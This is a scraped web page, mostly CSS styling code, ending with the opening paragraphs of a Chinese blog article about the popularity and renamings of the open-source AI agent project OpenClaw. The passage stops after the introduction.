                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtxieM5wyIhq5GskMNpidN7oJV2LzqTn0qvol+jDxvrGYcZS4z3GncZjJpYmCSYrTRpNnpgSTRmmmaZbTNtNh82MzKLMis3qzR6aE8wZ5nzzbeYd5qMWlhZJFqstmi0GLbUtWZZFlvWWj60oVn5W+Va1VnessdYM6xzrndZdNrCNmw3fpsbmli1s624rsN1p222HsfO0E9rV2t2zJ9sz7Qvt6+37HGgOkQ4rHZod3kw3m546fdP0junfHd0ccx33OT5y0nAKd1rp1Or0ztnGmeNc43zHheIS4rLMpcXlrautK891l+t9N6pblNtqt3a3b+4e7mL3BvchDzOPdI8dHvcYmowYxjrGVU+MZ4DnMs8znp+93L0KvE54/eFt753jfdh7cIblDN6MfTP6fUx82D57fGS+dN903598ZX7Gfmy/Wr9n/qb+XP8D/i+Y1sxs5hHmmwDHAHHAqYDRQK/AJYFtQaig0KCyoM5gjeCE4OrgpyEmIVkh9SHDoW6hi0PbwjBhEWGbwu6xDFgcVh1rONwjfEn4pQhyRFxEdcSzSJtIcWRrFBwVHrU56vFM85nCmc3RIJoVvTn6SYxlTH7ML7Ows2Jm1cx6HusUWxzbEUeNmxd3OO5jfED8hvhHCVYJ0oT2RNXEtMS6xNGkoKSKJFny9OQlyTdSdFMEKS2puNTE1AOpI7ODZ2+dPZDmllaadneO5ZyFc67N1Z2bO/fsPNV57Hkn0zHpSemH07+yo9m17JEMVsaOjGFOIGcb5xXXn7uFO8Tz4VXwXmT6ZFZkDmb5ZG3OGuL78Sv5rwWBgmrB2+yw7N3ZoznROQdz5LlJuY15+Lz0vNNCDWGO8NJ8w/kL53eLbEWlIlm+V/7W/GFxhPiABJLMkbQUaCIi6abUSvqDtK/Qt7Cm8NOCxAUnF6ovFC68uchm0dpFL4pCivYvRi/mLG4vNi5eUdy3hLlkz1JoacbS9mWmy0qWDSwPXX5oBXFFzopfVzqurFj5YVXSqtYSg5LlJf0/hP5QX6pSKi69t9p79e416DWCNZ1rXdZuX/u9jFt2vdyxvLL86zrOuus/Ov1Y9aN8feb6zg3uG3ZtxG4Ubry7yW/ToQr1iqKK/s1Rm5u20LeUbfmwdd7Wa5Wulbu3EbdJt8mqIqtatptt37j9azW/urcmoKZxh/6OtTtGd3J39uzy39Ww22B3+e4vPwl+ur8ndE9TrUVt5V7s3sK9z/cl7uvYz9hfd0D3QPmBbweFB2WHYg9dqvOoqzusf3hDPVwvrR86knak62jQ0ZYG+4Y9jbTG8mPgmPTYy+Ppx++eiDjRfpJxsuFn8593nKKeKmuCmhY1DTfzm2UtKS3dp8NPt7d6t576xeGXg2eMz9Sc1Tq74RzxXMk5+fmi8yNtorbXF7Iu9LfPa390MfninUuzLnVejrh89UrIlYsdzI7zV32unrnmde30dcb15hvuN5puut089avbr6c63Tubbnncauny7GrtntF9rsev58LtoNtX7rDu3Oid2dt9N+Hu/Xtp92T3ufcHH+Q+ePuw8OHYo+WPMY/Lnqg9qXyq/7T2N+vfGmXusrN9QX03n8U9e9TP6X/1u+T3rwMlzynPK18YvagbdB48MxQy1PVy9suBV6JXY69L/6H+jx1vrN78/If/HzeHk4cH3orfyt+te6/z/uAH1w/tIzEjTz/mfRwbLfuk8+nQZ8bnji9JX16MLfiK+1r1zfpb6/eI74/leXK5iC1mj0sBFDLgzEwA3h1EtHEKAFRElxNnT2jrcYMmvgfGCfwnntDf4+YOQAMyKWQR0x+Akwo5i8wqyKyQRPH+AHZxUY5/mSTTxXkiFxlRlphPcvl7AwBwrQB8E8vlYzvl8m/7kGIfANCWP6HpFYZFtHyD3vJRg6LbPe3g7zah9//U499noKjAFfx9/ieoZhkWVvYkwwAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAEKgAwAEAAAAAQAAAEIAAAAAgodoEQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAhRJREFUeAHtnLEuBFEUhs9cu7JCskEhIrZAgYZGoREPwBuIygOoPITKA6jEG/AAolFoaFCgICIKZBNiY8Pyz5rNOWe9wNz5T7N3Z2eT/b/7zZlpziat3xKWBDJoEyh5EDd3DTk5r8vV7Yc8vzbl6zvfwvSERIYHyzI90SeLc1WZrFV85PR9oi+N/YMnOT6t/3tiLAeXFqqytjrSFacDYmfvQS6u37tOiPHA7FS/bK6PmWhpj4AJRYGA9MiKzLpK6An+cqiNVmRleUhArrec6PNzt/5sttLgh0cvcvfY6Px+ZNY9I6Ax6gKErY1xmZ8ZyD0E5MJGIgsyIZsunT3g7qALJuTdAp0nWyMTsunS2QNukbpwOcRaPpvOHvxzQow2ZBvrs+nsfLL8o0QQBJFdMO1XGkEjaIQlQCMsD/YIGkEjLAEaYXmwR9AIGmEJ0AjLgz2CRtAIS4BGWB7sETSCRlgCNMLyYI+gETTCEqARlgd7BI2gEZYAjbA82CNoBI2wBGiE5cEeQSNohCVAIywP9ggaQSMsARphebBH0AgaYQnQCMsjYC5SF2agYi2fTWcPGA7VFfO0n8+mswdMyOrCNJwnpz/P6xqZkE2Xzh4w8qcLI4Hbu/dydvkWBRAAQBZk0uOOyKyzp5PARRiF1puNtR+NTh+oMCvtJ+D8F2N6j6x+PrwzG46gRTDDm5BtsAGBg0X924Qfj7i23p7HNgQAAAAASUVORK5CYII=");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>2026年开年的AI智能体项目中，<strong>OpenClaw</strong> 无疑是近期最受瞩目的现象级开源成果。该项目在 GitHub 上开源不到一个月，便斩获近 <strong>15 万 Star</strong>，热度甚至超越 Claude Code。有趣的是，它曾在短短一个月内历经三次更名——从 Clawd Bot 到 MoltBot，再到如今的 OpenClaw，其迭代之快甚至超过了笔者的更文速度。</p>
<p><strong>OpenClaw</strong> 不仅受到开发者社区的狂热追捧，还获得了 OpenAI 联合创始人 Karpathy 的高度评价，被称为“迄今为止最实用的智能体项目”。其影响力甚至溢出技术圈，一度因众多用户争相部署而带动 Mac Mini 抢购热潮，足以见证它的受欢迎程度。</p>
